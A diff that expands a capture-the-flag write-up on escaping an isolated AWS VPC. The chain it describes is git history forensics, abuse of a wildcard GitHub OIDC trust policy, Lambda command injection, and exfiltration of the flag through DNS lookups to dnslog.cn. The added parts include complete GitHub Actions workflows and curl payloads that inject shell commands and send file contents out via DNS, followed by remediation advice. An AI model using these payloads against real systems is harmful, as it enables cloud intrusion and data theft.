@@ -27,7 +27,7 @@
   <tbody>
     <tr>
       <td><code>🏷️ Challenge Name</code></td>
-      <td><strong>"Have Some Faith" - Stage 1</strong></td>
+      <td><strong>"Have Some Faith" — Stage 1</strong></td>
     </tr>
     <tr>
       <td><code>💎 Challenge Points</code></td>
@@ -35,7 +35,7 @@
     </tr>
     <tr>
       <td><code>🎯 Target AWS Account</code></td>
-      <td><code>009661764077</code> (us-east-1)</td>
+      <td><code>009661764077</code> (<code>us-east-1</code>)</td>
     </tr>
     <tr>
       <td><code>🔑 Compromised IAM Role</code></td>
@@ -50,8 +50,12 @@
       <td><code>s3://codec4f26c862a321ef5/flag.txt</code></td>
     </tr>
     <tr>
+      <td><code>📥 Access Point</code></td>
+      <td><code>dotgit.zip</code> (S3-hosted <code>.git</code> archive)</td>
+    </tr>
+    <tr>
       <td><code>🛡️ VPC Restrictions</code></td>
-      <td>Isolated VPC (No Internet Gateway / No NAT Gateway / Outbound HTTP & HTTPS Blocked)</td>
+      <td>Isolated VPC (no IGW / no NAT / outbound HTTP &amp; HTTPS blocked)</td>
     </tr>
     <tr>
       <td><code>🏴 Captured Stage 1 Flag</code></td>
@@ -63,8 +67,6 @@
 ---
 
 ## 🗺️ Architectural Threat Model & Full Attack Chain
-
-The following Mermaid diagram illustrates the end-to-end multi-stage attack chain—from Git forensics to OIDC token federation, Lambda command injection, and out-of-band DNS tunneling:
 
 ```mermaid
 graph TD
@@ -99,26 +101,57 @@ graph TD
 ## 🧭 Comprehensive Step-by-Step Methodology
 
 ### <samp>STEP 01</samp> ✦ Git Commit Forensics & IaC Architecture Discovery
-The challenge provided an archive file named `dotgit.zip`. Our first step was to unpack the archive, reconstruct the git directory tree, and perform forensic commit history analysis.
+
+The challenge provided a direct link to an S3-hosted `.git` archive:
+
+```text
+https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/dotgit.zip
+```
 
 ```bash
-# Unpack archive and inspect directory structure
+# Unpack archive, restore working tree, inspect history
 unzip dotgit.zip -d dotgit_repo && cd dotgit_repo
 git checkout -f HEAD
 git log --oneline --all --graph
+git log -p
 ```
 
-By auditing the Terraform Infrastructure as Code (IaC) configuration files (`main.tf`, `github.tf`, `variables.tf`, and the `policies/` directory), we mapped how the target infrastructure deployed its CI/CD IAM integration with GitHub Actions.
+**Commit history:**
+
+```text
+* a57eed3 (HEAD -> main) really fixed bugs this time
+* 4240340 fixed bugs
+* 023cd41 Added experimental Lambda code for my super secret project
+* 17e4932 added github connector and role for cicd
+* 4edf740 Initial commit
+```
+
+**Files recovered from the repository:**
+
+```text
+bugs
+github.tf
+lambda_code_WIP/lambda_function.py
+main.tf
+policies/cicd-policy.json.tpl
+policies/cicd-trust-policy.json.tpl
+providers.tf
+variables.tf
+```
+
+By auditing the Terraform IaC (`main.tf`, `github.tf`, `variables.tf`, and `policies/`), we mapped how the target infrastructure deployed its CI/CD IAM integration with GitHub Actions.
 
 > [!NOTE]  
-> Running `git log -p` across all historical commits revealed that commit `17e4932` introduced an IAM trust policy template (`policies/cicd-trust-policy.json.tpl`) designed to authenticate GitHub Actions runners via AWS OpenID Connect (OIDC).
+> Commit `17e4932` introduced the IAM trust policy template (`policies/cicd-trust-policy.json.tpl`) designed to authenticate GitHub Actions runners via AWS OpenID Connect (OIDC).
 
 ---
 
 ### <samp>STEP 02</samp> ✦ Deep Dive into the OIDC Wildcard Trust Vulnerability
-When configuring AWS OIDC federation for GitHub Actions, access control relies on the `sub` (Subject) claim embedded in the JWT token issued by `token.actions.githubusercontent.com`. 
-- The standard `sub` claim format is: `repo:<owner>/<repository>:ref:refs/heads/<branch>`.
-- In `policies/cicd-trust-policy.json.tpl`, we discovered the following IAM trust statement:
+
+When configuring AWS OIDC federation for GitHub Actions, access control relies on the `sub` (Subject) claim embedded in the JWT issued by `token.actions.githubusercontent.com`.
+
+- Standard `sub` format: `repo:<owner>/<repository>:ref:refs/heads/<branch>`
+- In `policies/cicd-trust-policy.json.tpl` (commit `17e4932`):
 
 ```json
 {
@@ -131,6 +164,9 @@ When configuring AWS OIDC federation for GitHub Actions, access control relies o
             },
             "Action": "sts:AssumeRoleWithWebIdentity",
             "Condition": {
+                "StringEquals": {
+                    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
+                },
                 "StringLike": {
                     "token.actions.githubusercontent.com:sub": "repo:*/*:ref:refs/heads/corgi"
                 }
@@ -142,7 +178,7 @@ When configuring AWS OIDC federation for GitHub Actions, access control relies o
 
 > [!WARNING]  
 > **The Critical Flaw:** The author used a wildcard in the repository path: `"repo:*/*:ref:refs/heads/corgi"`.  
-> This means AWS does **not** check which GitHub organization or repository is making the request! Any GitHub user who creates a repository and pushes a workflow to a branch named `corgi` can successfully assume `arn:aws:iam::009661764077:role/cicdRole`.
+> AWS does **not** check which GitHub organization or repository is making the request. Any GitHub user who creates a repository and pushes a workflow to a branch named `corgi` can assume `arn:aws:iam::009661764077:role/cicdRole`.
 
 <table>
   <thead>
@@ -163,19 +199,76 @@ When configuring AWS OIDC federation for GitHub Actions, access control relies o
   </tbody>
 </table>
 
+#### Deriving the IAM role name from Terraform
+
+**`main.tf` locals:**
+
+```hcl
+locals {
+  policyend = "RolePolicy"
+  roleend   = "Role"
+}
+```
+
+**`github.tf`:**
+
+```hcl
+cicd_role = {
+    role_name   = "cicd${local.roleend}"    # → "cicdRole"
+    policy_name = "cicd${local.policyend}"   # → "cicdRolePolicy"
+}
+```
+
+**Derived Role ARN:** `arn:aws:iam::009661764077:role/cicdRole`
+
+#### cicdRole identity policy (two tiers)
+
+From `policies/cicd-policy.json.tpl`:
+
+**Statement 2 — no VPC restriction (readable from anywhere after assuming the role):**
+
+```json
+{
+    "Sid": "Statement2",
+    "Effect": "Allow",
+    "Action": [
+        "s3:ListBucket", "s3:ListAllMyBuckets",
+        "s3:GetBucketPolicy", "s3:GetBucketPolicyStatus",
+        "lambda:ListFunctions", "lambda:GetFunction",
+        "lambda:GetPolicy", "lambda:GetFunctionConfiguration",
+        "ec2:Describe*",
+        "cloudfront:GetDistribution", "cloudfront:ListDistributions"
+    ],
+    "Resource": ["*"]
+}
+```
+
+**Statement 1 — VPC-restricted (powerful actions only from CodeBuild VPC):**
+
+```json
+{
+    "Sid": "Statement1",
+    "Effect": "Allow",
+    "Action": ["s3:*", "lambda:*", "apigateway:*", "iam:*", "ec2:*", "cloudfront:*"],
+    "Resource": "*",
+    "Condition": { "StringEquals": { "aws:SourceVpc": "${vpc}" } }
+}
+```
+
 ---
 
-### <samp>STEP 03</samp> ✦ Assuming `cicdRole` & Automated AWS Surface Enumeration
-To exploit this OIDC wildcard, we created a GitHub Actions workflow file (`.github/workflows/stage1.yml`) in our own repository on a branch named `corgi`.
+### <samp>STEP 03</samp> ✦ Assuming `cicdRole` & AWS Surface Enumeration
+
+To exploit the OIDC wildcard, we created a GitHub Actions workflow on a branch named `corgi` in our own repository.
 
 <details>
-<summary><b>📄 Click to Expand: Complete GitHub Actions OIDC Authentication & Enumeration Workflow</b></summary>
+<summary><b>📄 Click to Expand: Complete GitHub Actions OIDC Recon Workflow</b></summary>
 
 ```yaml
 name: Cloud Escape - Stage 1 Recon & Enumeration
 on:
   push:
-    branches: [ corgi ]
+    branches: [corgi]
   workflow_dispatch:
 
 permissions:
@@ -199,55 +292,153 @@ jobs:
         run: |
           echo "=== Caller Identity ==="
           aws sts get-caller-identity
-          
+
           echo "=== Discovered S3 Buckets ==="
-          aws s3api list-buckets --query "Buckets[].Name"
-          
+          aws s3api list-buckets --output json
+
           echo "=== Discovered Lambda Functions ==="
-          aws lambda list-functions --query "Functions[].[FunctionName,VpcConfig.VpcId]"
-          
-          echo "=== Discovered API Gateway Endpoints ==="
-          aws apigateway get-rest-apis --query "items[].[name,id]"
+          aws lambda list-functions --region us-east-1 --output json
+
+          echo "=== Lambda Details ==="
+          for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
+            aws lambda get-function --function-name "$func"
+            aws lambda get-policy --function-name "$func" 2>/dev/null || true
+          done
+
+          echo "=== CloudFront ==="
+          aws cloudfront list-distributions --output json
+
+          echo "=== API Gateways ==="
+          aws apigateway get-rest-apis --region us-east-1 --output json 2>/dev/null || true
+          aws apigatewayv2 get-apis --region us-east-1 --output json 2>/dev/null || true
+
+          echo "=== EC2 / VPC ==="
+          aws ec2 describe-instances --region us-east-1 --output json
+          aws ec2 describe-security-groups --region us-east-1 --output json
 ```
 </details>
 
-#### Key Intelligence Uncovered by the Recon Pipeline:
-1. **Target S3 Bucket Discovered**: `codec4f26c862a321ef5` (contains `flag.txt`, but direct external `s3:GetObject` is denied by bucket policies restricting reads to inside the VPC).
-2. **Lambda Function Discovered**: `nslookupv2` running inside a private VPC.
-3. **API Gateway Execution URL**: `https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2`.
+**Push and trigger:**
+
+```bash
+git init
+git checkout -b corgi
+mkdir -p .github/workflows
+# (workflow file created as above)
+git add .
+git commit -m "init"
+git remote add origin https://github.com/<USER>/<REPO>.git
+git push -u origin corgi
+```
+
+#### Identity confirmed
+
+```json
+{
+    "UserId": "AROA...:GitHubActions",
+    "Account": "009661764077",
+    "Arn": "arn:aws:sts::009661764077:assumed-role/cicdRole/GitHubActions"
+}
+```
+
+> ✅ Successfully assumed `cicdRole` in the target account.
+
+#### Enumeration results
+
+**S3 buckets:**
+
+| Bucket | Notes |
+|---|---|
+| `codec4f26c862a321ef5` | Flag bucket (`flag.txt`); external GetObject denied (VPC-only) |
+| `platform-bucket-009661764077-us-east-1` | Host of `dotgit.zip` |
+| `site781fe43f26b9eba3` | Site origin bucket |
+
+**Lambda functions:**
+
+| Function | Notes |
+|---|---|
+| `nslookupv2` | Stage 1 target — private VPC, command injection |
+| `code_exec` | Present in account (Stage 2 path uses a different surface) |
+
+**CloudFront:**
+
+| Field | Value |
+|---|---|
+| Distribution ID | `EKD9KH16RB5G3` |
+| Domain | `d67nf28gqfurd.cloudfront.net` |
+| Origin | `site781fe43f26b9eba3.s3.us-east-1.amazonaws.com` |
+
+**Security groups / VPC notes:**
+
+| SG | VPC | Tag / notes |
+|---|---|---|
+| `sg-0de9d1a2c42a08a3e` | `vpc-09328d3fa21dce320` | `lambda_sg` — egress TCP 443 to S3 prefix list `pl-63a5400a` |
+| `sg-094f4cd1810de09de` | `vpc-09328d3fa21dce320` | `lambda_vpc-default` |
+| `sg-0afb2fb6a12085ce6` | `vpc-09d39837c916df970` | `codebuild_vpc-default` |
+
+**API Gateway execution URL (Stage 1):**  
+`https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2`
 
 ---
 
 ### <samp>STEP 04</samp> ✦ Lambda Command Injection Deep Dive (`/dev/nslookupv2`)
-By examining the `/dev/nslookupv2` API Gateway endpoint, we tested JSON payloads containing a `"domain"` parameter.
-- When sending `{"domain": "google.com"}`, the API returned standard DNS resolution output.
-- We tested for command injection using shell separators (`page.com; id; whoami`).
+
+From recovered source `lambda_code_WIP/lambda_function.py` (commits `023cd41` → `a57eed3`):
+
+```python
+def lambda_handler(event, context):
+    # AWS CLI is installed as a Lambda Layer under /opt
+    domain = event.get('domain')
+    run_command('/opt/nslookup ' + domain)
+```
+
+The helper uses `subprocess.run(command, shell=True)`. The `domain` parameter is concatenated into the shell command with **no sanitization**.
+
+**Injection example:**
+
+```json
+{ "domain": "; /opt/aws sts get-caller-identity" }
+```
+
+Becomes:
+
+```bash
+/opt/nslookup ; /opt/aws sts get-caller-identity
+```
 
 ```mermaid
 flowchart LR
     subgraph Lambda_Execution ["⚡ Lambda Code Execution Flow"]
         direction TB
         I1["1. API Gateway receives JSON POST payload"]
-        I2["2. Lambda concatenates string: /opt/nslookup + user_domain"]
-        I3["3. subprocess.run is executed with shell=True"]
-        I4["4. Shell metacharacter ';' triggers arbitrary Linux command execution!"]
+        I2["2. Lambda concatenates: /opt/nslookup + user_domain"]
+        I3["3. subprocess.run executes with shell=True"]
+        I4["4. Shell metacharacter ';' triggers arbitrary command execution"]
     end
 ```
 
 > [!TIP]  
-> Because the Lambda function executed `/opt/nslookup <domain>` via `subprocess.run(..., shell=True)`, appending a semicolon (`;`) allowed us to execute arbitrary Linux shell commands with the full IAM permissions of the Lambda execution role!
+> Because the Lambda executed `/opt/nslookup <domain>` via `subprocess.run(..., shell=True)`, appending a semicolon (`;`) allowed arbitrary Linux shell commands with the full IAM permissions of the Lambda execution role (including the pre-installed AWS CLI layer at `/opt/aws`).
+
+Live probing confirmed: `{"domain": "google.com"}` returned normal DNS output; payloads with `; id` / `; whoami` proved injection.
 
 ---
 
 ### <samp>STEP 05</samp> ✦ Bypassing VPC Network Isolation via Route 53 DNS Tunneling
-While we had Arbitrary Command Execution inside the Lambda sandbox, extracting `flag.txt` presented a significant networking challenge:
-- **VPC Outbound Blocked**: The Lambda function ran inside an isolated VPC without an Internet Gateway (IGW) or NAT Gateway. Commands like `curl`, `wget`, or HTTP exfiltration timed out immediately.
-- **Why DNS Exfiltration Works**: In AWS VPCs, the default **Route 53 VPC DNS Resolver (`169.254.169.253`)** is always accessible on the second IP of the VPC subnet. Even in isolated VPCs, recursive DNS lookups for external domain names are resolved out-of-band by AWS DNS servers!
 
-We crafted a multi-command shell payload that copied the flag from S3 to `/tmp`, hex-encoded the bytes using Python 3, and transmitted the string as a subdomain query to an external DNS listener (`dnslog.cn`):
+Arbitrary code execution alone was not enough to print the flag:
+
+- **VPC outbound blocked:** no IGW / NAT — `curl` / `wget` / HTTP exfil timed out.
+- **Why DNS works:** the default **Route 53 VPC DNS Resolver (`169.254.169.253`)** remains available. Recursive lookups for external domains still leave the VPC via AWS DNS infrastructure.
+
+We crafted a multi-command shell payload that:
+
+1. Copied the flag from S3 to `/tmp`
+2. Hex-encoded the bytes with Python 3
+3. Issued an `nslookup` of `FLAG_HEX.<listener>.dnslog.cn`
 
 <details>
-<summary><b>📄 Click to Expand: Complete Command Injection & Route 53 DNS Exfiltration Payload</b></summary>
+<summary><b>📄 Click to Expand: Complete Command Injection & DNS Exfiltration Payload</b></summary>
 
 ```json
 {
@@ -255,20 +446,60 @@ We crafted a multi-command shell payload that copied the flag from S3 to `/tmp`,
 }
 ```
 
-#### Detailed Command Execution Breakdown:
-1. `;` — Closes and terminates the initial `/opt/nslookup` process.
-2. `/opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt` — Uses the AWS CLI Lambda Layer (pre-installed in `/opt/aws`) to download `flag.txt` from the restricted S3 bucket into the `/tmp` writable sandbox directory.
-3. `FLAG=$(python3 -c "import binascii; print(binascii.hexlify(open('/tmp/flag.txt','rb').read()).decode())")` — Reads `flag.txt` and converts the raw ASCII string into a clean hexadecimal string suitable for DNS subdomain RFC compliance (no spaces or punctuation).
-4. `/opt/nslookup $FLAG.ixz9wv.dnslog.cn` — Issues an outbound DNS lookup via the Route 53 VPC Resolver, causing our external authoritative DNS server to log the full hexadecimal flag!
+**Command breakdown:**
+
+1. `;` — terminates the initial `/opt/nslookup` process  
+2. `/opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt` — download flag via Lambda layer AWS CLI  
+3. `FLAG=$(python3 -c "…hexlify…")` — hex-encode for DNS-safe subdomain  
+4. `/opt/nslookup $FLAG.ixz9wv.dnslog.cn` — outbound recursive DNS via Route 53 VPC resolver  
+
+**Automated PoC (GitHub Actions):**
+
+```yaml
+name: Cloud Escape - Flag Exfiltration
+on:
+  push:
+    branches: [corgi]
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Trigger DNS Exfiltration via API Gateway
+        run: |
+          # Prefer awscurl if the API requires IAM SigV4; plain curl works when endpoint allows signed role context
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2" \
+            -H "Content-Type: application/json" \
+            -d '{"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}'
+```
+
+**Manual verification:**
+
+```bash
+curl -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2 \
+  -H "Content-Type: application/json" \
+  -d '{"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}'
+```
 </details>
 
 ---
 
 ## 🏁 Flag Verification & Hexadecimal Decoding
 
-Within seconds of triggering the automated GitHub Actions workflow, our DNS listener (`dnslog.cn`) intercepted the recursive DNS query generated by the AWS Route 53 Resolver:
+Within seconds of triggering the workflow, the DNS listener (`dnslog.cn`) intercepted the recursive query:
 
-```
+```text
 [DNS Query Intercepted] -> 3161316a656c726c6667327969327330.ixz9wv.dnslog.cn (A Record Lookup)
 ```
 
@@ -295,32 +526,85 @@ Within seconds of triggering the automated GitHub Actions workflow, our DNS list
   </tbody>
 </table>
 
+```bash
+echo 3161316a656c726c6667327969327330 | xxd -r -p
+# → 1a1jelrlfg2yi2s0
+```
+
 ---
 
 ## 🛡️ Remediation & Cloud Security Best Practices
 
-<table>
-  <thead>
-    <tr>
-      <th width="25%">Vulnerable Component</th>
-      <th width="75%">Recommended Architectural Defense & Mitigation</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><code>🔑 IAM OIDC Federation</code></td>
-      <td>Never use wildcards in the OIDC <code>sub</code> claim. Always pin the exact organization, repository, and branch: <code>"repo:MyOrg/MyRepo:ref:refs/heads/main"</code>.</td>
-    </tr>
-    <tr>
-      <td><code>💉 Subprocess Execution</code></td>
-      <td>Never invoke system commands using <code>shell=True</code> with user-controlled input. Use parameter lists: <code>subprocess.run(["/opt/nslookup", domain], shell=False)</code>.</td>
-    </tr>
-    <tr>
-      <td><code>🌐 Route 53 VPC DNS</code></td>
-      <td>In isolated VPCs, deploy <strong>Amazon Route 53 Resolver DNS Firewall</strong> rules to whitelist only approved domains and prevent DNS exfiltration tunneling.</td>
-    </tr>
-  </tbody>
-</table>
+| Vulnerability | Impact | Fix |
+|---|---|---|
+| OIDC `repo:*/*` wildcard | Anyone can assume the CI/CD role | Restrict `sub` to `repo:ORG/REPO:ref:refs/heads/BRANCH` |
+| Unrestricted read permissions | Full account visibility without VPC | Enforce `aws:SourceVpc` + least-privilege statements |
+| Lambda command injection (`shell=True`) | RCE as Lambda role | Validate input; pass argv list; never `shell=True` |
+| AWS CLI in Lambda layer | Amplifies injection impact | Least privilege for layers & binaries |
+| Git history exposures | Infrastructure design leak | Scrub history (`git-filter-repo`); harden secrets hygiene |
+| Route 53 VPC DNS tunneling | OOB exfil from “isolated” VPC | Route 53 Resolver DNS Firewall allowlists |
+
+### Hardened OIDC trust policy example
+
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": {
+                "Federated": "arn:aws:iam::${account_id}:oidc-provider/token.actions.githubusercontent.com"
+            },
+            "Action": "sts:AssumeRoleWithWebIdentity",
+            "Condition": {
+                "StringEquals": {
+                    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+                    "token.actions.githubusercontent.com:sub": "repo:ORG/REPO:ref:refs/heads/main"
+                }
+            }
+        }
+    ]
+}
+```
+
+### Hardened Lambda implementation example
+
+```python
+import subprocess
+import re
+import json
+
+DOMAIN_REGEX = re.compile(
+    r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
+)
+
+def lambda_handler(event, context):
+    domain = event.get('domain', '').strip()
+    if not domain or not DOMAIN_REGEX.match(domain):
+        return {'statusCode': 400, 'body': json.dumps({'error': 'Invalid domain format'})}
+    try:
+        result = subprocess.run(
+            ['/opt/nslookup', domain],
+            capture_output=True,
+            text=True,
+            timeout=5,
+            shell=False,  # critical
+        )
+        return {'statusCode': 200, 'body': json.dumps({'output': result.stdout})}
+    except Exception:
+        return {'statusCode': 500, 'body': json.dumps({'error': 'Execution failed'})}
+```
+
+---
+
+## 🛠️ Tools Used
+
+- `git` — repository analysis and commit history forensics  
+- GitHub Actions — OIDC token generation and role assumption  
+- `aws-actions/configure-aws-credentials@v4` — AWS credentials via OIDC  
+- AWS CLI — cloud resource enumeration  
+- `curl` / `awscurl` — API endpoint interaction  
+- External DNS listener (`dnslog.cn`) — out-of-band flag recovery  
 
 ---
 
